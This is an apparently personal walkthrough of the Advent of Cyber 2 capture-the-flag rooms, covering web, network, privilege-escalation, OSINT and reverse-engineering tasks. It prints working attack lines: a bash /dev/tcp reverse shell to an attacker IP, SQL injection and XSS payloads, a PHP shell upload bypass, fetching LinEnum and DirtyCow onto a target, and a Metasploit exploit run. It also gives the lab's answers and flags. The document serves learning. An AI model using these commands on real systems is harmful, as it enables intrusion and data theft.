# Advent Of Cyber 2 - Easy

1. [A Christmas Crisis](#a-christmas-crisis)
2. [The Elf Strikes Back](#the-elf-strikes-back)
3. [Christmas Chaos](#christmas-chaos)
4. [Santa's Watching](#santas-watching)
5. [Someone stole Santa's gift list](#someone-stole-santas-gift-list)
6. [Be careful with what you wish on a Christmas night](#be-careful-with-what-you-wish-on-a-christmas-night)
7. [The Grinch Really Did Steal Christmas](#the-grinch-really-did-steal-christmas)
8. [What's Under the Christmas Tree](#whats-under-the-christmas-tree)
9. [Anyone can be Santa](#anyone-can-be-santa)
10. [Don't be sElfish](#dont-be-selfish)
11. [The Rogue Gnome](#the-rogue-gnome)
12. [Ready, set, elf](#ready-set-elf)
13. [Coal for Christmas](#coal-for-christmas)
14. [Where's Rudolph](#wheres-rudolph)
15. [There's a Python in my stocking](#theres-a-python-in-my-stocking)
16. [Help! Where is Santa](#help-where-is-santa)
17. [ReverseELFneering](#reverseelfneering)
18. [The Bits of Christmas](#the-bits-of-christmas)
19. [The Naughty or Nice List](#the-naughty-or-nice-list)
20. [PowershELlf to the rescue](#powershellf-to-the-rescue)
21. [Time for some ELForensics](#time-for-some-elforensics)
22. [Elf McEager becomes CyberElf](#elf-mceager-becomes-cyberelf)
23. [The Grinch strikes again](#the-grinch-strikes-again)
24. [The Trial Before Christmas](#the-trial-before-christmas)

## A Christmas Crisis

```markdown
According to the instructions, we register by creating an account on the IP address.

Using those credentials, we log into our account.

In Developer tools, we can view more info about cookies.

Name of cookie used for authentication - auth.

Clearly, the value of this cookie is encoded in hexadecimal.

Now, after decoding the value of cookie, we get a JSON string.

Here, the string is quite predictable as all we have to do is replace the username part, and convert the JSON string to hex.

For Santa's cookie, we just need to replace the username part to 'santa' and convert to hex and remove whitespace.

Once we paste Santa's cookie value in the Developer Tools section and refresh the website, we get admin controls.

On turning everything back to normal, we get the flag required.
```

## The Elf Strikes Back

```markdown
The reference material highlights that with POST requests the data being sent is included in the "body" of the request, while with GET requests, the data is included in the URL as a "parameter".

We are also given an ID number - ODIzODI5MTNiYmYw - to gain access to upload section of site.

Once we go to the website, we are told to enter our ID as a GET parameter.

So we need to append '?id=ODIzODI5MTNiYmYw' to the URL.

This leads to the upload page. We get to know that image files are accepted by the site.

Now, on checking the page source code, we get to know that the accepted file extensions include .jpg, .jpeg and .png

So we can use a PHP reverse shell file, but rename it with the extension .jpg.php, to bypass the filter.

This file gets uploaded, and we can check the uploads in /uploads/ directory.

Set up a listener using 'nc -nvlp 1234'

Once we go to the /uploads/ directory and select the reverse shell file (with the .jpg.php extension), the page indefinitely loads.

At our netcat listener, we have received the reverse shell, and now we can view the flag at /var/www/flag.txt

Flag - THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}
```

## Christmas Chaos

```markdown
For this room, we have to use Burp Suite to brute-force and do a dictionary attack on the login form.

We have to start Burp to intercept the traffic, proxy should be turned on.

Once we are on the login form, we have to enter random credentials and submit details into the form.

The request would be captured by Proxy in Burp, and we have to forward it to Intruder, where we can do the Cluster Bomb attack as given in the reference.

Once the attack is done, we get the credentials admin:12345

Using credentials to login, we get the flag.
```

## Santa's Watching

```markdown
The reference material has given commands for tools such as gobuster and wfuzz

wfuzz command required for given URL question - wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ

Now, we need to use gobuster to find the API directory (for the given IP)
Command - gobuster dir -u http://10.10.187.195 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php

This gives us the directory /api, where we find the file site-log.php

Now, we need to fuzz the date parameter on /site-log.php, so the URL should look like /site-log.php?date=DATE

The date parameter required for fuzzing are given to us in a wordlist file.

We can use wfuzz.

Command - wfuzz -z file,wordlist --hh 0 http://10.10.187.195/api/site-log.php?date=FUZZ
Here, '--h 0' is used to hide responses with 0 characters.

As a result, we get the payload on date=20201125.

Flag - THM{D4t3_AP1}
```

## Someone stole Santa's gift list

```markdown
According to given case, we have to access the website <http://10.10.34.237:8000/> and replicate a SQLi attack.

For sqlmap, we can use this cheatsheet: <https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet>

From the clue given, we can guess that the secret login panel for the website is in /santalogin

To bypass the login, we can enter " a' or 1=1 --+ " in the password field and submit. This gives us access to the panel.

On using the search field with the payload " ' OR 1 -- - " , we find out that there are 22 entries in the database; Paul has asked for 'github ownership'.

Now, to get the complete database, we will have to use sqlmap and Burp Suite together.

Once we have access to login, we can capture the request for searching the database in /santapanel, and forward that request to Repeater; then we can save item and use sqlmap

This will give us access to the databases
```

```markdown
This is how the request in Burp Suite would look like:

GET /santapanel?search=apple HTTP/1.1
Host: 10.10.34.237:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://10.10.34.237:8000/santapanel
Cookie: session=eyJhdXRoIjp0cnVlfQ.YmU5Ww.DKmuj42iMNRkVYJNdBpNdk2zwfM
Upgrade-Insecure-Requests: 1
```

```shell
#with the request file saved, we can use sqlmap
sqlmap -r nameofrequestfile --tamper=space2comment --dbms=SQLite --dump-all
#dumps all info

#flag - thmfox{All_I_Want_for_Christmas_Is_You}
#admin password - EhCNSWzzFP6sc7gB
```

## Be careful with what you wish on a Christmas night

```markdown
OWASP ZAP, a open-source web app security scanner, can be used to scan the given website for web vulnerabilities.

Other than that, we can use XSS payloads in the website.

After trying the payloads, we can see that the website is indeed vulnerable to stored cross-site scripting.

Example of payload - <script>alert('1')</script>

Furthermore, on using search query, we can see that the parameter 'q' can be used for reflected XSS.

Example - http://10.10.233.121:5000/?q=<script>alert(document.domain)</script>

Now, we can use ZAP to scan the website and check the alerts.
```

## The Grinch Really Did Steal Christmas

```markdown
While using Wireshark for the task files, we can use filters to narrow down our search results.

For pcap1.pcap:

1. What is the IP address that initiates an ICMP/ping? - 10.11.3.2

2. If we only wanted to see HTTP GET requests, what filter would we use? - http.request.method == GET

3. Apply the filter; what is the name of the article that the IP address 10.10.67.199 visited? - reindeer-of-the-week

For pcap2.pcap:

1. From the captured FTP traffic, what password was leaked during the login process? - plaintext_password_fiasco

2. What is the name of the protocol that is encrypted? - SSH

For pcap3.pcap:

1. What is on Elf McSkidy's wishlist that will be used to replace Elf McEager? - rubber ducky

Checking the protocols used, we can see that HTTP was used.
We can see some files there.

In Wireshark, choose File > Export Objects > HTTP, and export the zip file.

In the zip file, we can view the wishlist.
```

## What's Under the Christmas Tree

```shell
nmap -T4 -Pn 10.10.16.201
#to ignore ICMP being used
#to determine if host is up

nmap -T4 -sV 10.10.16.201
#for version fingerprinting

nmap --script http-title -p 80 10.10.16.201
#to determine http-title of webserver
```

```markdown
1. When was Snort created? - 1998

2. What are the port numbers of the three services running? - 80,2222,3389

3. What is reported as the most likely distribution to be running? - Ubuntu

4. Based on the "HTTP-TITLE" value of the webserver, what might be this website used for? - blog
```

## Anyone can be Santa

```shell
ftp 10.10.202.128
#anonymous login

ls #shows all directories
#only public is accessible

cd public
#shows two files

get backup.sh

get shoppinglist.txt

quit

#in our system, we can view both the files
#now, we can reupload the backup.sh script by replacing it with malicious code
#we can use one-liners for getting a reverse shell
#bash -i >& /dev/tcp/10.17.48.136/4444 0>&1

#setup a listener
nc -nvlp 4444

#login to ftp again
ftp 10.10.202.128

cd public

put backup.sh
#in a minute, we will get access as root
#we have access now
cat flag.txt
```

```markdown
1. Name the directory on the FTP server that has data accessible by the 'anonymous' user? - public

2. What script gets executed within this directory? - backup.sh

3. What movie did Santa have on his Christmas shopping list? - The Polar Express

4. Content of flag.txt? - THM{even_you_can_be_santa}
```

## Don't be sElfish

```shell
enum4linux -h
#tool for enumerating Linux machines

enum4linux -U -S 10.10.213.77
#get possible users and shares
#shows that one of the shares doesn't require a password, so we can login

smbclient //10.10.213.77/tbfc-santa
#can login without password
```

```markdown
1. Using enum4linux, how many users are there on the Samba server? - 3

2. How many shares are there on the Samba server? - 4

3. Use smbclient to try to login to the shares on the Samba server. What share doesn't require a password? - tbfc-santa

4. Log in to this share, what directory did ElfMcSkidy leave for Santa? - jingle-tunes
```

## The Rogue Gnome

```shell
ssh cmnatic@10.10.30.56
#log into ssh using given creds

pwd

echo $0
#shows bash shell, we can try to upgrade

python3 -c 'import pty; pty.spawn("/bin/bash")'

echo $0
#/bin/bash

find / -name id_rsa 2>/dev/null
#trying to find id_rsa file

find / -perm -u=s -type f 2>/dev/null
#searching for executables with SUID bit set

#we can try uploading and running enumeration scripts
#in attacker machine
python3 -m http.server 8080

#in target machine
cd /tmp

wget http://10.17.48.136:8080/linenum.sh
#gets linenum.sh in target machine

chmod +x linenum.sh

./linenum.sh
#gives a lot of output, we've to read through the scan to find exploits
#this shows that /bin/bash has SUID bit set
#we can look up on GTFObins to find exploits

/bin/bash -p

id #we have root access now

cat /root/flag.txt
#we get the flag
```

```markdown
1. What type of privilege escalation involves using a user account to execute commands as an administrator? - Vertical

2. What is the name of the file that contains a list of users who are a part of the sudo group? - sudoers

3. What are the contents of flag.txt? - thm{2fb10afe933296592}
```

## Ready, set, elf

```shell
nmap -T4 -p- -A 10.10.176.13
#shows that host seems down, so we use -Pn

nmap -T4 -Pn -A 10.10.176.13
#gives details about web services
#gives Apache Tomcat web server version
#searching for the version vulnerability or cve shows us results

#according to given data
#we can view cgi scripts in /cgi-bin
#further, the script name is also given as elfwhacker.bat
#so /cgi-bin/elfwhacker.bat shows us details

msfconsole
#metasploit

search 2019-0232
#gives us a module

use 0
#use that module

show options

set LHOST 10.17.48.136

set RHOSTS 10.10.176.13

set TARGETURI /cgi-bin/elfwhacker.bat

show options

run
#gives us access to machine

shell
#for using system commands

dir

type flag1.txt
#from here, we can attempt privilege escalation
```

```markdown
1. What is the version number of the web server? - 9.0.17

2. What CVE can be used to create a Meterpreter entry onto the machine? - CVE-2019-0232

3. What are the contents of flag1.txt? - thm{whacking_all_the_elves}
```

## Coal for Christmas

```shell
nmap -T4 -p- -A 10.10.86.167
#lists ports, services
#we can use telnet to login

telnet 10.10.86.167 23
#gives creds santa:clauschristmas
#we can login further

#after logging in
pwd

python -c 'import pty; pty.spawn("/bin/bash")'
#upgrade to /bin/bash

ls
#shows files

cat /etc/*release
#shows distribution version

cat cookies_and_milk.txt
#shows some C source code
#portion of DirtyCow kernel exploit
#we can use the complete exploit code for privilege escalation

#in attacker machine
vim dirty.c

python3 -m http.server 8080

#in target machine
wget http://10.17.48.136:8080/dirty.c

ls

gcc -pthread dirty.c -o dirty -lcrypt
#compiles dirty.c

ls

./dirty
#runs the exploit
#we can give any password to new user
#now we can switch to this user

su firefart
#enter new password

id
#root access

cd /root

ls

cat message_from_the_grinch.txt
#run commands according to note, to get flag

touch coal

tree | md5sum
#gives flag
```

```markdown
1. What protocol and service is running? - telnet

2. What credential was left? - clauschristmas

3. What distribution of Linux and version number is this server running? - Ubuntu 12.04

4. Who got here first? - Grinch

5. What is the verbatim syntax you can use to compile? - gcc -pthread dirty.c -o dirty -lcrypt

6. What new username was created, with the default operations of the source code? - firefart

7. What is the MD5 hash output? - 8b16f00dd3b51efadb02c1df7f8427cc
```

## Where's Rudolph

```markdown
The reference material gives us a list of resources which can be used for OSINT in this case:

<https://namechk.com/>
<https://whatsmyname.app/>
<https://namecheckup.com/>
<https://github.com/WebBreacher/WhatsMyName>
<https://github.com/sherlock-project/sherlock>

Now, it's given that the Reddit username of Rudolph is 'IGuidetheClaus2020'.

On Googling the username, we can view the Reddit and Twitter profile.
```

```markdown
1. What URL will take me directly to Rudolph's Reddit comment history? - https://www.reddit.com/user/IGuidetheClaus2020/comments/

2. According to Rudolph, where was he born? - Chicago

3. Rudolph mentions Robert.  Can you use Google to tell me Robert's last name? - May

4. On what other social media platform might Rudolph have an account? - Twitter

5. What is Rudolph's username on that platform? - IGuideClaus2020
```

```markdown
Now that we have found both profiles of Rudolph, we have to use reverse image searching to find details about the photo, such as location, and other metadata.

exiftool is a great tool for getting metadata from images.

We can also use discovered emails and usernames to search through breached data to identify possible passwords, names, and other data.
```

```markdown
6. What appears to be Rudolph's favorite TV show right now? - Bachelorette

7. Based on Rudolph's post history, he took part in a parade.  Where did the parade take place? - Chicago

8. Okay, you found the city, but where specifically was one of the photos taken? - 41.891815, 87.624277

9. Did you find a flag too? - {FLAG}ALWAYSCHECKTHEEXIFD4T4

10. Has Rudolph been pwned? What password of his appeared in a breach? - spygame

11. Based on all the information gathered.  It's likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile.  What are the street numbers of the hotel address? - 540
```

## There's a Python in my stocking

```markdown
This is a short introduction to Python.

1. What's the output of True + True? - 2

2. What's the database for installing other peoples libraries called? - PyPi

3. What is the output of bool("False")? - True

4. What library lets us download the HTML of a webpage? - requests

5. What is the output of the given program? - [1, 2, 3, 6]

6. What causes the previous task to output that? - Pass by Reference
```

## Help! Where is Santa

```shell
```

## ReverseELFneering

```shell
#logging in using given creds
ssh elfmceager@10.10.240.224

ls
#view challenge1 file

./challenge1
#does not give any output
#we can debug it

r2 -d ./challenge1
#open binary in debug mode
#in radare2 now

aa
#analysis command

afl
#list of functions

afl | grep main
#find main function

pdf @main
#print disassembly function of main
#analyze code

db 0x00400b51
#set required breakpoints

db 0x00400b62

db 0x00400b69

pdf @main
#print function to check breakpoints

dc
#execute program till breakpoint hit

pdf @main
#view rip (current instruction)

px @ rbp-0xc
#view contents of local_ch variable
#where rbp-0xc is memory address of local_ch
#this shows that local_ch value is 0

ds
#executes next instruction (next step)

px @ rbp-0xc
#now, on viewing contents of local_ch again
#we see that value is 1

#similarly, we can follow this method
#to view contents of other variables at breakpoints set

dr
#to view register contents

ds
#next step

dr
#this shows eax value as 6 now

exit
#exit radare2
```

```markdown
1. What is the value of local_ch when its corresponding movl instruction is called? - 1

2. What is the value of eax when the imull instruction is called? - 6

3. What is the value of local_4h before eax is set to 0? - 6
```

## The Bits of Christmas

```markdown
Given, we can disassemble apps created using .NET framework, using tools such as ILSpy or Dotpeek.

We can connect remotely using the command 'xfreerdp /u:cmnatic /p:Adventofcyber! /v:10.10.247.137'

After connecting, we can open the TBFC_APP in ILSpy to decompile it.

Once it loads, we can expand the resources given in the app, and start going through each element.

We come across an element named 'crackme' with more resources nested inside, we can go through them to find the password.

Once we get the password, we can submit the password to the app in order to get the flag.
```

```markdown
1. What is Santa's password? - santapassword321

2. What is the flag? - thm{046af}
```

## The Naughty or Nice List

```shell
```

## PowershELlf to the rescue

```shell
```

## Time for some ELForensics

```shell
```

## Elf McEager becomes CyberElf

```shell
```

## The Grinch strikes again

```shell
```

## The Trial Before Christmas

```shell
```
